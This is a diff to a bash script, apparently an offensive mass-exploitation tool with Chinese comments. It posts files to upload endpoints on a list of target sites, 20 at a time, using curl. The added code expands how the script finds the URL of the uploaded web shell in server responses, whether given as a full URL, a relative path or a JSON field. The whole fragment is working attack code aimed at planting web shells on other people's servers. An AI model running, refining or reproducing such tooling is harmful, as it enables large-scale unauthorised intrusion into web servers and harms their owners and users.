@@ -50,8 +50,28 @@ cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
             resp=$(curl -skL -m 5 "$url$path" -F "file=@/tmp/u_$$_${ext}" -F "upload=@/tmp/u_$$_${ext}" \
                 -H "User-Agent: Mozilla/5.0" 2>/dev/null)
             
-            # 提取shell URL（严格匹配）
+            # 提取shell URL（支持完整URL、相对路径、JSON格式）
+            shell=""
+            # 方式1: 完整URL
             shell=$(echo "$resp" | grep -oE "https?://[a-zA-Z0-9._-]+/[a-zA-Z0-9._/-]+\.${ext}" | head -1)
+            # 方式2: 相对路径（需要拼接）
+            if [ -z "$shell" ]; then
+                rel_path=$(echo "$resp" | grep -oE "[a-zA-Z0-9._/-]+\.${ext}" | grep -vE "^http" | head -1)
+                if [ -n "$rel_path" ]; then
+                    shell="${url}${rel_path}"
+                fi
+            fi
+            # 方式3: JSON格式 {"url":"path"} 或 {"file":"path"}
+            if [ -z "$shell" ]; then
+                json_path=$(echo "$resp" | grep -oE '"(url|file|path|location)":"[^"]*\.'${ext}'"' | grep -oE '[^"]*\.'${ext} | head -1)
+                if [ -n "$json_path" ]; then
+                    if echo "$json_path" | grep -qE "^https?://"; then
+                        shell="$json_path"
+                    else
+                        shell="${url}${json_path#/}"
+                    fi
+                fi
+            fi
             
             # 验证1: URL格式正确
             if [ -n "$shell" ] && echo "$shell" | grep -qE "^https?://" && echo "$shell" | grep -q "\.${ext}$"; then
